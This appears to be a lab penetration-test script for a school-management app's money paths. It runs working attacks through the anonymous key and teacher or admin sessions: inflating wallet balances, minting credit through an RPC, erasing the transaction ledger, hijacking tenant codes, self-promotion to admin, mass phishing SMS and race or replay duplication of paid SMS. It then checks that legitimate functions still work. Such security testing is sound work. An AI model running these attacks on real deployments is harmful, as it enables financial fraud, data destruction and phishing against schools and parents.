// Round 3 "rogue" money pentest: anyone with the public anon key, a teacher,
// a school admin, and race/replay attacks on every path that costs money
// (wallet, top-ups, paid SMS). Usage: node rogue-attack.mjs <base> <appDir> <label>
// Env: RLS=1 (always), HARDEN=0 to model a deploy that skipped 04's optional
// public-schema step, MIG06=0 to run without migration 06.
import pg from 'pg';
import fs from 'fs';
import crypto from 'crypto';
import { execSync } from 'child_process';
import { setupUsers, sessionCookie, actionIds, callAction, SHIM } from './lib.mjs';
import seedMod from './seed.js';
const { IDS: { A, B }, SECRETS } = seedMod;
const [BASE, APPDIR, LABEL = 'run'] = process.argv.slice(2);
execSync('node seed.js', { cwd: '/home/user/mt-lab', env: process.env });
await fetch(SHIM + '/__reload', { method: 'POST' });
await setupUsers();
const db = new pg.Client({ host: '127.0.0.1', port: 54329, user: 'postgres', password: 'pw', database: 'mtlab' });
await db.connect();
const q = async (s, p) => (await db.query(s, p)).rows;
const results = []; const broken = [];
const rec = (name, vuln, detail) => { results.push({ name, vulnerable: !!vuln, detail: String(detail ?? '') }); console.log((vuln ? 'VULNERABLE ' : 'secure     ') + name + '  [' + String(detail ?? '').slice(0, 150) + ']'); };
const legit = (name, pass, detail) => { if (!pass) broken.push(name); console.log((pass ? 'legit-ok   ' : 'LEGIT-FAIL ') + name + '  [' + String(detail ?? '').slice(0, 150) + ']'); };
const bal = async (s) => Number((await q('SELECT coalesce(sum(balance),0) b FROM public.wallets WHERE tenant_id=$1 OR school_id=$1', [s]))[0].b);
const nCount = async (s) => Number((await q('SELECT count(*) n FROM school.notifications WHERE school_id=$1', [s]))[0].n);

const tok = async (email) => (await (await fetch(SHIM + '/auth/v1/token?grant_type=password', { method: 'POST', body: JSON.stringify({ email, password: 'Passw0rd!' }) })).json()).access_token;
const T = { anon: 'lab-anon-key', admin: await tok('adminA@lab.io'), teacher: await tok('teacherA@lab.io') };
async function rest(who, method, path, { schema = 'school', body, prefer = (method === 'GET' ? undefined : 'return=minimal') } = {}) {
  const h = { apikey: 'lab-anon-key', Authorization: 'Bearer ' + T[who], 'Content-Type': 'application/json' };
  if (prefer) h.Prefer = prefer;
  h[method === 'GET' ? 'Accept-Profile' : 'Content-Profile'] = schema;
  const r = await fetch(SHIM + '/rest/v1/' + path, { method, headers: h, body: body ? JSON.stringify(body) : undefined });
  let data = null; try { data = await r.json(); } catch {}
  return { status: r.status, rows: Array.isArray(data) ? data : [], data };
}
const ids = actionIds(APPDIR);
const cks = { admin: await sessionCookie('adminA@lab.io'), teacher: await sessionCookie('teacherA@lab.io') };
const act = (n, args, who = 'admin') => { const a = ids[n][0]; return callAction(BASE, '/' + a.page.replace(/^app\//, '').replace(/\/page$/, '').replace('[classId]', A.cls), a.id, args, cks[who]); };

// Seed a wallet for each school so there is something to steal / inflate.
for (const s of [A.school, B.school]) {
  if (!(await q('SELECT 1 FROM public.wallets WHERE tenant_id=$1', [s])).length)
    await q("INSERT INTO public.wallets(id, tenant_id, school_id, balance, currency) VALUES (gen_random_uuid(), $1, $1, 10000, 'UGX')", [s]);
}

// ======================= M: direct database (REST) =======================
let b0 = await bal(B.school);
await rest('anon', 'PATCH', 'wallets?tenant_id=eq.' + B.school, { schema: 'public', body: { balance: 99999999 } });
rec('M1 anonymous visitor sets any school wallet balance', (await bal(B.school)) > b0, 'B ' + b0 + ' -> ' + (await bal(B.school)));
b0 = await bal(A.school);
await rest('admin', 'PATCH', 'wallets?tenant_id=eq.' + A.school, { schema: 'public', body: { balance: 99999999 } });
rec('M2 school admin sets own wallet balance', (await bal(A.school)) > b0, 'A ' + b0 + ' -> ' + (await bal(A.school)));
b0 = await bal(B.school);
let r = await rest('anon', 'POST', 'rpc/credit_wallet', { schema: 'public', body: { p_school_id: B.school, p_amount: 5000000, p_tx_ref: 'free-' + Date.now() } });
rec('M3 anonymous visitor mints credit via public.credit_wallet RPC', (await bal(B.school)) > b0, r.status + ' B delta=' + ((await bal(B.school)) - b0));
b0 = await bal(A.school);
r = await rest('teacher', 'POST', 'rpc/credit_wallet', { schema: 'public', body: { p_school_id: A.school, p_amount: 5000000, p_tx_ref: 'free2-' + Date.now() } });
rec('M4 teacher mints credit via credit_wallet RPC', (await bal(A.school)) > b0, r.status + ' A delta=' + ((await bal(A.school)) - b0));
r = await rest('anon', 'GET', 'transactions?select=id,amount,reference', { schema: 'public' });
rec('M16 anonymous visitor reads the money ledger', r.rows.length > 0, r.status + ' rows=' + r.rows.length);
const txCount = async () => Number((await q('SELECT count(*) n FROM public.transactions'))[0].n);
let tx0 = await txCount();
r = await rest('anon', 'POST', 'transactions', { schema: 'public', body: { amount: 50000, type: 'credit', reference: 'fake-' + Date.now(), status: 'completed' } });
rec('M5 anonymous visitor inserts fake ledger credit', (await txCount()) > tx0, r.status);
tx0 = await txCount();
r = await rest('anon', 'DELETE', 'transactions?id=not.is.null', { schema: 'public' });
rec('M6 anonymous visitor erases the money ledger', (await txCount()) < tx0, r.status + ' ledger rows ' + tx0 + ' -> ' + (await txCount()));
const bCode = (await q('SELECT code FROM public.tenants WHERE id=$1', [B.school]))[0]?.code;
await rest('anon', 'PATCH', 'tenants?id=eq.' + B.school, { schema: 'public', body: { code: 'attacker-tenant' } });
const bCode2 = (await q('SELECT code FROM public.tenants WHERE id=$1', [B.school]))[0]?.code;
rec("M7 anonymous visitor rewrites school B's NaJiki tenant code (B's top-ups paid to attacker tenant)", bCode2 !== bCode, bCode + ' -> ' + bCode2);
await q('UPDATE public.tenants SET code=$1 WHERE id=$2', [bCode, B.school]);
await rest('admin', 'PATCH', 'tenants?id=eq.' + B.school, { schema: 'public', body: { code: 'attacker-tenant' } });
const bCode3 = (await q('SELECT code FROM public.tenants WHERE id=$1', [B.school]))[0]?.code;
rec("M8 school A admin rewrites school B's tenant code", bCode3 !== bCode, bCode + ' -> ' + bCode3);
await q('UPDATE public.tenants SET code=$1 WHERE id=$2', [bCode, B.school]);
await q("INSERT INTO public.profiles(id, user_id, school_id, code) VALUES ('aaaaaaaa-0000-4000-8000-0000000000a1','aaaaaaaa-0000-4000-8000-0000000000a1',$1,NULL) ON CONFLICT (id) DO NOTHING", [A.school]);
r = await rest('admin', 'PATCH', 'profiles?user_id=eq.aaaaaaaa-0000-4000-8000-0000000000a1', { schema: 'public', body: { code: bCode, school_id: B.school } });
const prof = (await q("SELECT code, school_id FROM public.profiles WHERE user_id='aaaaaaaa-0000-4000-8000-0000000000a1' OR id='aaaaaaaa-0000-4000-8000-0000000000a1'"))[0];
rec('M9 admin rewrites own profile code/school (tenant-code & webhook school resolution)', prof && (prof.code === bCode || prof.school_id === B.school), r.status + ' ' + JSON.stringify(prof));
await q("UPDATE public.profiles SET code=NULL, school_id=$1 WHERE user_id='aaaaaaaa-0000-4000-8000-0000000000a1' OR id='aaaaaaaa-0000-4000-8000-0000000000a1'", [A.school]);
r = await rest('admin', 'PATCH', 'schools?id=eq.' + A.school, { body: { settings: { balance: 50000000 } } });
const st = (await q('SELECT settings FROM school.schools WHERE id=$1', [A.school]))[0].settings;
rec('M10 admin writes school.settings.balance (legacy balance seeds new wallets)', st && Number(st.balance) === 50000000, r.status + ' ' + JSON.stringify(st).slice(0, 60));
await q("UPDATE school.schools SET settings = settings - 'balance' WHERE id=$1", [A.school]);
let n0 = await nCount(A.school);
r = await rest('teacher', 'POST', 'notifications', { body: Array.from({ length: 50 }, () => ({ school_id: A.school, recipient_type: 'parent', channel: 'sms', status: 'pending', recipient_phone_snapshot: '+256700999999', message: 'URGENT: send school fees to 0700999999' })) });
rec('M11 teacher queues 50 arbitrary paid SMS (phishing at school cost)', (await nCount(A.school)) > n0, r.status + ' queued=' + ((await nCount(A.school)) - n0));
await q("DELETE FROM school.notifications WHERE recipient_phone_snapshot='+256700999999'");
const sentId = (await q("INSERT INTO school.notifications(school_id, recipient_type, channel, status, message) VALUES ($1,'parent','sms','sent','already paid for') RETURNING id", [A.school]))[0].id;
await rest('admin', 'PATCH', 'notifications?id=eq.' + sentId, { body: { status: 'pending' } });
const st2 = (await q('SELECT status FROM school.notifications WHERE id=$1', [sentId]))[0].status;
rec('M12 sent SMS flipped back to pending (re-sent and re-charged)', st2 === 'pending', 'status=' + st2);
n0 = await nCount(B.school);
r = await rest('anon', 'POST', 'notifications', { body: { school_id: B.school, recipient_type: 'parent', channel: 'sms', status: 'pending', message: 'spam' } });
rec('M13 anonymous visitor queues SMS for any school', (await nCount(B.school)) > n0, r.status);
const tRow = (await q("SELECT id FROM school.staff_users WHERE auth_user_id='aaaaaaaa-0000-4000-8000-0000000000a2'"))[0];
r = await rest('teacher', 'PATCH', 'staff_users?id=eq.' + tRow.id, { body: { staff_role: 'admin' } });
const role = (await q('SELECT staff_role FROM school.staff_users WHERE id=$1', [tRow.id]))[0].staff_role;
rec('M14 teacher promotes self to school admin (then can top up / edit parents)', role === 'admin', r.status + ' role=' + role);
await q("UPDATE school.staff_users SET staff_role='teacher' WHERE id=$1", [tRow.id]);
r = await rest('admin', 'GET', 'wallets?select=tenant_id,balance', { schema: 'public' });
rec("M15 admin reads other schools' wallet balances", r.rows.some((w) => w.tenant_id === B.school), r.status + ' rows=' + r.rows.length);

// ======================= K: paid-SMS races / replays =======================
const eatHour = Number(new Intl.DateTimeFormat('en-GB', { timeZone: 'Africa/Kampala', hour: '2-digit', hour12: false }).format(new Date()));
const checkoutWindow = eatHour >= 16 && eatHour < 22;
const resetAttendance = async () => { await q('DELETE FROM school.notifications WHERE school_id=$1', [A.school]); await q('DELETE FROM school.attendance_logs WHERE school_id=$1', [A.school]); };
const smsFor = async () => Number((await q("SELECT count(*) n FROM school.notifications WHERE school_id=$1 AND notification_type='attendance'", [A.school]))[0].n);
if (checkoutWindow) {
  await resetAttendance();
  await act('submitClockInAction', ['102']);              // morning check-in (no SMS at this hour)
  await Promise.all(Array.from({ length: 10 }, () => act('submitClockInAction', ['102'])));
  const k1 = await smsFor();
  rec('K1 kiosk: 10 simultaneous check-outs queue several paid SMS', k1 > 1, 'SMS queued=' + k1 + ' (should be 1)');
  legit('kiosk check-out still queues the parent SMS', k1 >= 1, 'SMS=' + k1);

  await resetAttendance();
  const PIN = '482913';
  await Promise.all(Array.from({ length: 6 }, () => act('submitClassAttendance', [A.cls, A.teacher, [A.student], [], 'check_out', PIN])));
  const k2 = await smsFor();
  rec('K2 manual attendance: 6 simultaneous submissions queue several paid SMS', k2 > 1, 'SMS queued=' + k2 + ' (should be 1)');
  legit('manual check-out still queues the parent SMS', k2 >= 1, 'SMS=' + k2);
} else {
  console.log('(K1/K2 skipped: outside the 16:00-22:00 EAT check-out SMS window)');
}
await resetAttendance();
const today = new Intl.DateTimeFormat('en-CA', { timeZone: 'Africa/Kampala' }).format(new Date());
const nowEat = new Date(Date.now() - 2 * 60 * 1000);
const hhmm = new Intl.DateTimeFormat('en-GB', { timeZone: 'Africa/Kampala', hour: '2-digit', minute: '2-digit', hour12: false }).format(nowEat);
const punchTime = checkoutWindow ? hhmm : '17:00';
const ic = (body) => fetch(BASE + '/iclock/cdata?' + new URLSearchParams({ SN: 'SNA0001', table: 'ATTLOG', token: SECRETS.A }), { method: 'POST', body });
await Promise.all([0, 1, 2, 3, 4].map((i) => ic(`102\t${today} ${punchTime}:0${i}\t1\t1\n`)));
const k3 = await smsFor();
rec('K3 device: 5 simultaneous uploads of a check-out queue several paid SMS', k3 > 1, 'SMS queued=' + k3 + ' (should be 1)');
legit('device check-out still queues the parent SMS', k3 === 1 || !checkoutWindow, 'SMS=' + k3 + ' window=' + checkoutWindow);
await ic(`102\t${today} ${punchTime}:09\t1\t1\n`);
rec('K4 device: replayed check-out later the same day queues another SMS', (await smsFor()) > Math.max(k3, 1), 'SMS now=' + (await smsFor()));

// ======================= T: top-up abuse =======================
const intents = async () => Number((await q('SELECT count(*) n FROM school.payment_intents WHERE school_id=$1', [A.school]))[0].n);
let i0 = await intents();
r = await act('topUpBalance', [5000, '0772123456'], 'teacher');
rec('T1 teacher starts a mobile-money top-up', (await intents()) > i0, JSON.stringify(r.value).slice(0, 90));
i0 = await intents();
for (const bad of [1000.5, -5, 0, 1e9, '1000', null]) await act('topUpBalance', [bad, '0772123456']);
rec('T2 malformed top-up amounts accepted', (await intents()) > i0, 'new intents=' + ((await intents()) - i0));
await q("INSERT INTO school.payment_intents(school_id, reference, amount, created_at) SELECT $1, 'flood-'||g||'-'||gen_random_uuid(), 500, now() - interval '1 minute' FROM generate_series(1, 1000) g", [A.school]);
i0 = await intents();
r = await act('topUpBalance', [2000, '0772123456']);
rec('T3 top-up limit only per server instance (1000 recent top-ups on other instances, still allowed)', (await intents()) > i0, JSON.stringify(r.value).slice(0, 90));
await q("DELETE FROM school.payment_intents WHERE reference LIKE 'flood-%'");

// ======================= legit =======================
i0 = await intents();
r = await act('topUpBalance', [3000, '0772123456']);
legit('admin top-up still starts (intent recorded)', r.value && r.value.success && (await intents()) === i0 + 1, JSON.stringify(r.value).slice(0, 90));
r = await act('getSchoolBalance', []);
legit('dashboard balance readable', r.value && typeof r.value.balance === 'number', JSON.stringify(r.value));
r = await rest('admin', 'GET', 'notifications?select=id');
legit('admin can still read own school SMS queue', r.status === 200, r.status + ' rows=' + r.rows.length);
r = await rest('admin', 'GET', 'wallets?select=balance&tenant_id=eq.' + A.school, { schema: 'public' });
legit('admin can still read own wallet', r.status === 200 && r.rows.length >= 1, r.status + ' ' + JSON.stringify(r.rows));
const sb = await fetch(SHIM + '/rest/v1/rpc/credit_wallet', { method: 'POST', headers: { apikey: 'lab-service-key', Authorization: 'Bearer lab-service-key', 'Content-Type': 'application/json', 'Content-Profile': 'public' }, body: JSON.stringify({ p_school_id: A.school, p_amount: 1, p_tx_ref: 'svc-' + Date.now() }) });
legit('server (service role) can still credit via credit_wallet', sb.status === 200, sb.status);

const v = results.filter((x) => x.vulnerable).length;
console.log(`\n[${LABEL}] ${v} vulnerable / ${results.length} checks; legit failures: ${broken.length ? broken.join(', ') : 'none'}`);
fs.writeFileSync(`/home/user/mt-lab/rogue-results-${LABEL}.json`, JSON.stringify({ vulnerable: v, total: results.length, broken, results }, null, 1));
await db.end();
